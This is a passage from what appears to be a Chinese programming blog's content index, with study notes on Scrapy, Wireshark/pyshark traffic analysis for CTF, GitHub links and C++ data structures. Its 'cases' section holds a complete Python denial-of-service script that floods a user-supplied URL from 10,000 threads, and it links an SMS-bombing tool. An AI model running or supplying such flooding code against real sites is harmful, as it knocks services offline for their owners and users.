)</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="七、框架"><a href="#七、框架" class="headerlink" title="七、框架"></a>七、框架</h2><h3 id="1-scrapy框架"><a href="#1-scrapy框架" class="headerlink" title="1 scrapy框架"></a>1 scrapy框架</h3><ul><li><p>基础</p><ul><li>安装：<code>pip install scrapy</code></li><li>功能：高性能的持久化存储，异步的数据下载，高性能的数据解析，分布式。</li></ul></li><li><p>基本使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在当前路径下创建工程</span></span><br><span class="line">scrapy startproject &lt;name&gt;</span><br></pre></td></tr></table></figure></li><li><p>spiders文件</p><ul><li><p>命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">该文件下必须放置一个爬虫文件</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入工程文件目录</span></span><br><span class="line">cd url</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在spiders中创建一个爬虫文件</span></span><br><span class="line">scrapy genspider &lt;name&gt; &lt;url&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行爬虫（-nolog：无日志显示，-o &lt;path&gt;：持久化存储）</span></span><br><span class="line">scrapy crawl &lt;name&gt;</span><br></pre></td></tr></table></figure></li><li><p>类变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    <span class="comment"># 爬虫文件的名称：就是爬虫源文件的唯一标识</span></span><br><span class="line">    name = <span class="string">&quot;first&quot;</span></span><br><span class="line">    <span class="comment"># 允许的域名：用来限定start_urls中哪些可以被允许发送（不使用直接删除）</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&quot;www.123.sogou.com&quot;]</span></span><br><span class="line">    <span class="comment"># 起始的url列表：存在的url会被scrapy自动进行请求发送</span></span><br><span class="line">    start_urls = [<span class="string">&quot;http://www.123.sogou.com/&quot;</span>]</span><br></pre></td></tr></table></figure></li><li><p>数据解析</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用作于数据解析：response参数表示的就是请求成功后对应的响应对象（有多少个url，parse则会被调用多少次）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):  </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 几乎同理etree，但他返回的是Selector对象，支持管道符</span></span><br><span class="line">res = response.xpath()</span><br><span class="line"><span class="comment"># res解析</span></span><br><span class="line"><span class="comment"># 获得Selector中的data数据（单个返回字符串，列表则返回一个列表，值为每个data的值）</span></span><br><span class="line">res.extract() / get()</span><br><span class="line"><span class="comment"># 获得Selector中的第一个data数据</span></span><br><span class="line">res.extract_first()</span><br></pre></td></tr></table></figure></li><li><p>持久化存储</p><ul><li><p>基于终端指令：只可以将parse方法的返回值存储到本地的文件中。</p><blockquote><p>parse 中返回一个列表（可以在列表中套字典）</p><p><code>scrapy crawl &lt;name&gt; -o &lt;path&gt;</code>：持久化存储（类型只能为’json ‘，’jsonlines’， ‘jl’， ‘csv’，’xml ‘，’marshal’，’pickle ‘）</p></blockquote></li><li><p>基于管道流程：</p><ol><li>进行数据解析。</li><li>在item类中定义相关的属性。</li><li>将解析的数据封装存储到item类型的对象。</li><li>将item类型的对象提交给管道进行持久化存储的操作。</li><li>在管道类的process_item中要将其接受到的item对象中存储的数据进行持久化存储操作。</li><li>在配置文件中开启管道。</li></ol></li><li>item类：items.py</li><li>管道：pipelines.py</li></ul></li></ul></li><li><p>items.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在item中类定义：</span></span><br><span class="line">&lt;name&gt; = scrapy.Field()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在parse中定义：</span></span><br><span class="line"><span class="keyword">from</span> &lt;project_name&gt;.items <span class="keyword">import</span> &lt;project_name&gt;Item</span><br><span class="line">item = &lt;project_name&gt;Item</span><br><span class="line">item[<span class="string">&#x27;str&#x27;</span>] = &lt;xpath&gt;</span><br><span class="line"><span class="keyword">yield</span> item <span class="comment"># 将item提交给了管道</span></span><br></pre></td></tr></table></figure></li><li><p>pipelines.py</p><blockquote><p>专门处理item对象，每接收到一个item就会被调用一次，item只会给第一个将被执行的管道类。</p><p>管道文件中一个管道类将一组数据存储到一个平台或载体中，所以可以继续定义。（需要在配置文件中加上新加的管道类和优先级）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line"><span class="comment"># 重写父类方法（仅开启和关闭一次文件）</span></span><br><span class="line"><span class="keyword">class</span>:</span><br><span class="line">    fp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_spider</span>(<span class="params"> self , spider </span>):</span><br><span class="line">        self.fp = <span class="built_in">open</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_spider</span>(<span class="params"> self , spider </span>):</span><br><span class="line">        self.fp.close()</span><br><span class="line"><span class="comment"># 主要数据操作</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params"> self , item , spider </span>):</span><br><span class="line">        &lt;name&gt; = item[ <span class="string">&#x27; str &#x27;</span> ]</span><br><span class="line">        self.fp.write()</span><br><span class="line">        <span class="keyword">return</span> item <span class="comment"># 传递给下一个将被执行的管道类</span></span><br></pre></td></tr></table></figure></li><li><p>settings.py</p><blockquote><p>爬虫配置文件</p></blockquote><ul><li>ROBOTSTXT_OBEY = True：遵从robots协议。（false不遵从）</li><li>USER_AGENT = ‘str’：UA伪装。</li><li># ITEM_PIPELINES = {}：取消注释打开。（数字为优先级，越小越高，可以写多个管道类）</li><li>添加：LOG_LEVEL = ‘str’：显示指定类型的日志信息（’ERROR’：错误信息）</li></ul></li></ul><hr><h2 id="八、案例"><a href="#八、案例" class="headerlink" title="八、案例"></a>八、案例</h2><h3 id="1-简单DOS攻击"><a href="#1-简单DOS攻击" class="headerlink" title="1 简单DOS攻击"></a>1 简单DOS攻击</h3><blockquote><p><a href="https://github.com/Magialeaf/Web/tree/main/Attack">my::DOS</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dos</span>(<span class="params">url:<span class="built_in">str</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    header = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url,headers=header)</span><br><span class="line">        <span class="comment"># print(&quot;Code:%s&quot;%response.status_code)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;输入网址:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        threading.Thread(target=Dos,args=(url,)).start()</span><br></pre></td></tr></table></figure><h3 id="2-短信轰炸"><a href="#2-短信轰炸" class="headerlink" title="2 短信轰炸"></a>2 短信轰炸</h3><blockquote><p><a href="https://github.com/OpenEthan/SMSBoom">短信轰炸</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github使用</title>
      <link href="/posts/ad18462f.html"/>
      <url>/posts/ad18462f.html</url>
      
        <content type="html"><![CDATA[<h1 id="github使用"><a href="#github使用" class="headerlink" title="github使用"></a>github使用</h1><h2 id="一、GithubDesktop安装"><a href="#一、GithubDesktop安装" class="headerlink" title="一、GithubDesktop安装"></a>一、GithubDesktop安装</h2><ul><li><a href="https://www.bilibili.com/video/BV1Gr4y177aE/?spm_id_from=333.337.search-card.all.click&amp;vd_source=b9521fbd84454f03eb78189e6ea6f9e6">githubDsektop汉化1</a></li><li><a href="https://www.jianshu.com/p/ae2dc489dddf">githubDsektop汉化2</a></li><li><a href="https://github.com/robotze/-GitHubDesktop_ZH">githubDsektop汉化工具</a></li></ul><h2 id="二、Github使用"><a href="#二、Github使用" class="headerlink" title="二、Github使用"></a>二、Github使用</h2><ul><li><a href="https://github.com/">official::github主页</a></li><li><a href="https://www.cnblogs.com/interdepend/p/10835742.html">github私人库给他人权限</a></li></ul><h2 id="三、Giuthub中别人的项目"><a href="#三、Giuthub中别人的项目" class="headerlink" title="三、Giuthub中别人的项目"></a>三、Giuthub中别人的项目</h2><ul><li><a href="https://github.com/kivvi3412/HandWrite">kivvi3412/HandWrite: 本项目为解决一些大学无用手写作业 (github.com)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析理论</title>
      <link href="/posts/7ab8e472.html"/>
      <url>/posts/7ab8e472.html</url>
      
        <content type="html"><![CDATA[<h1 id="Flow理论"><a href="#Flow理论" class="headerlink" title="Flow理论"></a>Flow理论</h1><blockquote><p><a href=".\f60fa43a">text::流量工具</a></p></blockquote><hr><h2 id="一、流量分析"><a href="#一、流量分析" class="headerlink" title="一、流量分析"></a>一、流量分析</h2><blockquote><p><a href="https://www.cnblogs.com/pangya/p/9936024.html">基础</a>    <a href="https://blog.csdn.net/qq_32393893/article/details/117574848">思路</a></p></blockquote><h3 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1 暴力破解"></a>1 暴力破解</h3><ul><li><p>方法</p><ol><li><p>wireshark——编辑查找——分组字节流——flag</p></li><li><p>记事本打开查找 flag</p></li></ol></li></ul><h3 id="2-普通分析"><a href="#2-普通分析" class="headerlink" title="2 普通分析"></a>2 普通分析</h3><ul><li><ol><li>首先分析协议和包长，长度出现一次的包可疑。</li><li>数据段之和。</li></ol></li><li>扫描分析<ol><li>icmp：ping。</li><li>tcp：半连接，全连接。</li></ol></li></ul><hr><h2 id="二、流量协议"><a href="#二、流量协议" class="headerlink" title="二、流量协议"></a>二、流量协议</h2><h3 id="1、TLS"><a href="#1、TLS" class="headerlink" title="1、TLS"></a>1、TLS</h3><blockquote><p>https的加密协议</p><p>SSL/TLS是一种密码通信框架，他是世界上使用最广泛的密码通信方法。SSL/TLS综合运用了密码学中的对称密码，消息认证码，公钥密码，数字签名，伪随机数生成器等，可以说是密码学中的集大成者。</p><p>SSL(Secure Socket Layer)安全套接层，是1994年由Netscape公司设计的一套协议，并与1995年发布了3.0版本。</p><p>TLS(Transport Layer Security)传输层安全是IETF在SSL3.0基础上设计的协议，实际上相当于SSL的后续版本。</p><p><a href="https://zhuanlan.zhihu.com/p/133375078">一篇文章让你彻底弄懂SSL/TLS协议 - 知乎 (zhihu.com)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析工具</title>
      <link href="/posts/f60fa43a.html"/>
      <url>/posts/f60fa43a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Flow工具"><a href="#Flow工具" class="headerlink" title="Flow工具"></a>Flow工具</h1><blockquote><p><a href=".\7ab8e472">text::流量理论</a></p></blockquote><hr><h2 id="一、网络工具"><a href="#一、网络工具" class="headerlink" title="一、网络工具"></a>一、网络工具</h2><ul><li><p>Wireshark（抓包工具）</p><ul><li><p>工具使用</p><blockquote><p><a href="https://blog.csdn.net/a745233700/article/details/102774703">链接</a></p><p>视图——时间显示格式：改时间显示。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令简单使用：</span><br><span class="line">(host 10.4.1.12 or src net 10.6.0.0/16) and tcp dst portrange 200-10000 and dst net 10.0.0.0/8</span><br><span class="line"></span><br><span class="line">包含字符串的协议：</span><br><span class="line">http contains &quot;shell&quot;</span><br><span class="line"></span><br><span class="line">ip过滤：</span><br><span class="line">ip.addr==47.56.157.205</span><br><span class="line">ip.src / ip.dst</span><br><span class="line"></span><br><span class="line">协议：</span><br><span class="line">tcp / udp</span><br><span class="line"></span><br><span class="line">端口：</span><br><span class="line">tcp.port==80</span><br></pre></td></tr></table></figure></li><li><p>py编程</p><blockquote><p><a href="https://github.com/Magialeaf/Misc/blob/main/Flow/wireshark%E5%88%86%E6%9E%90.py">my::分析案例</a></p><p><a href="https://github.com/KimiNewt/pyshark/">pyshark包</a></p><p><a href="https://blog.csdn.net/qq_42411587/article/details/119909870">Tshark</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地的pcap文件，记得加路径，或者直接改config</span></span><br><span class="line">capture=pyshark.FileCapture(<span class="string">&#x27;fetus_pcap.pcap&#x27;</span>,tshark_path=<span class="string">&#x27;D:\CTF\Capoo\Internet\Wireshark\\&#x27;</span>)</span><br><span class="line"><span class="comment"># 协议类型</span></span><br><span class="line">pack.layer_name == <span class="string">&#x27;icmp&#x27;</span>:</span><br><span class="line"><span class="comment"># 加上int转类型，否则是类接下来无法迭代</span></span><br><span class="line"><span class="built_in">int</span>(pack.data_len)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = []</span><br><span class="line">    <span class="comment"># 加载本地的pcap文件</span></span><br><span class="line">    capture=pyshark.FileCapture(<span class="string">&#x27;fetus_pcap.pcap&#x27;</span>,tshark_path=<span class="string">&#x27;Wireshark\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> capture:</span><br><span class="line">        <span class="keyword">for</span> pack <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="keyword">if</span> pack.layer_name == <span class="string">&#x27;icmp&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(pack.<span class="built_in">type</span>) != <span class="number">0</span>:</span><br><span class="line">                    count.append(<span class="built_in">int</span>(pack.data_len))  <span class="comment"># 加上 int 转类型，否则是类接下来无法迭代</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count:</span><br><span class="line">        res += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(res))</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="二、GPS工具"><a href="#二、GPS工具" class="headerlink" title="二、GPS工具"></a>二、GPS工具</h2><ul><li><p>GPS文件分析</p><blockquote><p><a href="https://www.gpsvisualizer.com/map_input">GPS文件分析网页</a></p></blockquote><ol><li><p><a href="https://www.gpsvisualizer.com/map_input">Make a HTML Map</a></p><blockquote><p>网页：选择文件 —— Draw the map</p></blockquote></li><li><p><a href="https://www.h-schmidt.net/NMEA/">txt转KML还原GPS</a>    <a href="https://mygeodata.cloud/converter/">KML可视化GPS</a></p><blockquote><p>选择 input 和 output 格式为 kml 和 CPS ，然后输出</p></blockquote></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法</title>
      <link href="/posts/4b0178e0.html"/>
      <url>/posts/4b0178e0.html</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构与算法"><a href="#数据结构与算法" class="headerlink" title="数据结构与算法"></a>数据结构与算法</h1><h1 id="C-数据结构与算法"><a href="#C-数据结构与算法" class="headerlink" title="C++数据结构与算法"></a>C++数据结构与算法</h1><blockquote><p><a href="https://github.com/Magialeaf/Course/tree/main/Data_Structure">my::数据结构与算法</a></p><p><a href="https://blog.csdn.net/xiezhi123456/article/details/90141172">指针的引用</a></p></blockquote><hr><h2 id="〇、绪论"><a href="#〇、绪论" class="headerlink" title="〇、绪论"></a>〇、绪论</h2><h3 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1 数据结构"></a>1 数据结构</h3><ul><li>术语<ul><li>数据：信息的载体。</li><li>数据元素：数据的基本单位，由若干个数据项组成。</li><li>数据对象：同性质元素集合。</li><li>数据类型：原子类型，结构类型，抽象数据类型（类）。</li></ul></li><li>数据结构三要素<ul><li>逻辑结构：线性结构，非线性结构。</li><li>存储结构：顺序存储，链式存储，索引存储，散列存储。</li></ul></li></ul><h3 id="2-算法"><a href="#2-算法" class="headerlink" title="2 算法"></a>2 算法</h3><ul><li>算法评估<ul><li>性质：有穷性，确定性，可行性，输入，输出。</li><li>好算法：正确性，可读性，健壮性，高效率与低储存量。</li><li>时间复杂度：T( n ) = O( f(n) )</li><li>时间复杂度数学定义：若 T(n) 和 f(n) 是定义再正整数集合上的两个函数，则存在正常数 C 和 n0，使得当 n &gt;= n0 时，都满足 0 &lt;= T(n) &lt;= Cf(n)</li><li>时间复杂度比较：<code>O(1) &lt; O(log2n) &lt; O(n) &lt; O(nlog2n) &lt; O(n**2) &lt; O(n**3) &lt; O(2**n) &lt; O(n!) &lt; O(n**n)</code></li><li>空间复杂度：S( n ) = O( g( n ) )，即辅助空间。</li></ul></li></ul><hr><h2 id="一、线性表"><a href="#一、线性表" class="headerlink" title="一、线性表"></a>一、线性表</h2><h3 id="1-线性表"><a href="#1-线性表" class="headerlink" title="1 线性表"></a>1 线性表</h3><blockquote><p>线性存储的一种数据结构。</p></blockquote><ul><li><p>线性表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 静态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;elem[],length&#125;;</span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;*data,length&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 初始化，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitList</span><span class="params">(SqList&amp; L)</span></span>;</span><br><span class="line"><span class="comment">// 返回线性表长，O(1)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Length</span><span class="params">(SqList L)</span></span>;</span><br><span class="line"><span class="comment">// 按值查找，O(n)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LocateElem</span><span class="params">(SqList L, ElemType e)</span></span>;</span><br><span class="line"><span class="comment">// 按位查找，注意超界，O(1)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetElem</span><span class="params">(SqList L, <span class="type">int</span> i)</span></span>;</span><br><span class="line"><span class="comment">// 插入，判断i，判断空间是否剩余，后续元素后移，O( n )</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert</span><span class="params">(SqList&amp; L,<span class="type">int</span> i,ElemType e)</span></span>;</span><br><span class="line"><span class="comment">// 删除，判断i，后续元素前移，O(n)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete</span><span class="params">(SqList&amp; L,<span class="type">int</span> i,ElemType&amp; e)</span></span>;</span><br><span class="line"><span class="comment">// 打印，遍历，O(n)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(SqList L)</span></span>;</span><br><span class="line"><span class="comment">// 判空，长度，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Empty</span><span class="params">(SqList L)</span></span>;</span><br><span class="line"><span class="comment">// 摧毁，长度置0，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyList</span><span class="params">(SqList&amp; L)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-链表"><a href="#2-链表" class="headerlink" title="2 链表"></a>2 链表</h3><blockquote><p>线性存储数据，存储的数据地址不连续。</p></blockquote><ul><li><p>单链表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data,*next&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 头插法逆向初始化单链表，先创建头结点，再输入值，O(n)</span></span><br><span class="line"><span class="function">LinkList <span class="title">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span></span>;</span><br><span class="line"><span class="comment">// 尾插法正向初始化，需要尾指针，其他同逆向，尾指针最后置空，O(n)</span></span><br><span class="line"><span class="function">LinkList <span class="title">List_TailInsert</span><span class="params">(LinkList &amp;L)</span></span>;</span><br><span class="line"><span class="comment">// 下标查找结点，O(n)</span></span><br><span class="line"><span class="function">Lode* <span class="title">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span></span>;</span><br><span class="line"><span class="comment">// 值查找结点，O(n)</span></span><br><span class="line"><span class="function">Lode* <span class="title">LocateElem</span><span class="params">(LinkList L,ElemType e)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原地插入删除 O(1)，查找结点再插入删除O(n)，求表长 O(n)。</span></span><br><span class="line"><span class="comment">// 删除插入某个结点的前一结点是 O(n)。</span></span><br></pre></td></tr></table></figure></li><li><p>双向链表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data,*next,*prior&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 便于找到前驱结点，更好地插入和删除。</span></span><br></pre></td></tr></table></figure></li><li><p>循环链表</p><ul><li><p>循环单链表</p><blockquote><p>基本同理，但判空条件不是 *next 指向 null ， 而是是否等于头指针。（指向头结点）</p></blockquote></li><li><p>循环双链表</p><blockquote><p>基本同理，空表时 <em>next 和 </em>prior 都指向头结点。</p></blockquote></li></ul></li><li><p>静态链表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 指针是数据下标（游标），其他同理。</span></span><br><span class="line"><span class="built_in">struct</span>()&#123;data,next&#125;;</span><br><span class="line"><span class="comment">// next 是下一元素的数组下标，next == -1 为结束标记</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-一元多项式"><a href="#3-一元多项式" class="headerlink" title="3 一元多项式"></a>3 一元多项式</h3><blockquote><p>用计算机表示一元多项式。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">LNode</span>&#123;</span><br><span class="line">    <span class="type">float</span> coef; <span class="comment">// 系数</span></span><br><span class="line">    <span class="type">int</span> expn; <span class="comment">// 指数</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LNode</span>* next; <span class="comment">// 链表下一项</span></span><br><span class="line">&#125;pnode, *polynomial;</span><br></pre></td></tr></table></figure><hr><h2 id="二、栈、队列和数组"><a href="#二、栈、队列和数组" class="headerlink" title="二、栈、队列和数组"></a>二、栈、队列和数组</h2><h3 id="1-栈"><a href="#1-栈" class="headerlink" title="1 栈"></a>1 栈</h3><blockquote><p>先进后出的线性表。</p></blockquote><ul><li><p>特性</p><ul><li>卡特兰数：n 个不同元素进栈，出栈可能是 1 / ( n + 1 ) * C( 2n , n )</li></ul></li><li><p>顺序栈</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 静态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data[],*next&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 初始化栈，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>;</span><br><span class="line"><span class="comment">// 判空，top == -1，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>;</span><br><span class="line"><span class="comment">// 入栈，栈满 top == MaxSize - 1，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,ElemType x)</span></span>;</span><br><span class="line"><span class="comment">// 出栈，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S , ElemType &amp;x)</span></span>;</span><br><span class="line"><span class="comment">// 读栈顶元素，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetTop</span><span class="params">(SqStack S , ElemType &amp;x)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>其他栈</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 共享栈</span></span><br><span class="line"><span class="comment">// 同空间不同栈底。</span></span><br><span class="line">(top0 == <span class="number">-1</span>) &amp;&amp; (top1 == MaxSize) <span class="comment">// 为空。</span></span><br><span class="line">(top1 - top0) == <span class="number">1</span> <span class="comment">// 为栈满</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 链栈</span></span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data,*next&#125;;</span><br></pre></td></tr></table></figure></li><li><p>栈的应用</p><ul><li><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/2-3.1栈char类型.cpp">my::文本编辑器代码</a></p></li><li><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/2-3.2迷宫算法.cpp">my::迷宫算法代码</a></p></li><li><p>表达式求值（未实现）</p></li></ul></li></ul><h3 id="2-队列"><a href="#2-队列" class="headerlink" title="2 队列"></a>2 队列</h3><blockquote><p>先进先出的线性表。</p></blockquote><ul><li><p>所有队列操作</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;</span><br><span class="line"><span class="comment">// 判空，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">(SqQueue Q)</span></span>;</span><br><span class="line"><span class="comment">// 入队，判满，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,ElemType x)</span></span>;</span><br><span class="line"><span class="comment">// 出队，判空，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q,ElemType &amp;x)</span></span>;</span><br><span class="line"><span class="comment">// 获得队头元素，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetHead</span><span class="params">(SqQueue Q,ElemType &amp;x)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>顺序队列</p><p><code>struct &#123; data[] , front , rear &#125;;</code></p><ul><li>栈空：<code>front = rear = 0</code></li><li><code>rear == MaxSize</code> 不能判断队满</li></ul></li><li><p>循环队列</p><ul><li>初始：<code>front = rear = 0</code></li><li>front+1：<code>front = (front + 1)%MaxSize</code></li><li>rear+1：<code>rear = (rear + 1)%MaxSize</code></li><li><p>长度：<code>(rear+MaxSize-front)%MaxSize</code></p></li><li><p>判断栈满：</p><ol><li>牺牲一个单元<ul><li>满：<code>(rear + 1)%MaxSize == front</code></li><li>空：<code>front == rear</code></li><li>长度：<code>(rear+MaxSize-front)%MaxSize</code></li></ul></li><li>增设表示元素个数的成员，size</li><li>设置 tag 判断队空<ul><li>tag = 0，因删除 <code>front == rear</code>，队空</li><li>tag = 1，因插入<code>front == rear</code>，队满</li></ul></li></ol></li></ul></li><li><p>链式队列</p><ul><li>结点：<code>struct node &#123;data,*next&#125;;</code></li><li>队列：<code>struct queue&#123;*front,*rear&#125;;</code></li><li><code>front == NULL &amp;&amp; rear == NULL</code> 队列为空</li></ul></li><li><p>双端队列</p><ul><li>两端入两端出。</li><li>输出受限：两端入一端出。</li><li>输入受限：一端入两端出。</li></ul></li><li><p>队列的应用</p></li></ul><h3 id="3-数组"><a href="#3-数组" class="headerlink" title="3 数组"></a>3 数组</h3><blockquote><p>维度和维界不变的线性表。</p><p><a href="https://blog.csdn.net/lamdonn/article/details/129192959">不定参数</a></p></blockquote><ul><li>行存储： <code>LOC(a[i,j]) = LOC(a[0,0])+[i*(col_len+ 1)+j]*size</code></li><li>列存储： <code>LOC(a[i,j]) = LOC(a[0,0])+[j*(row_len+1)+i]*size</code></li></ul><h3 id="4-特殊矩阵"><a href="#4-特殊矩阵" class="headerlink" title="4 特殊矩阵"></a>4 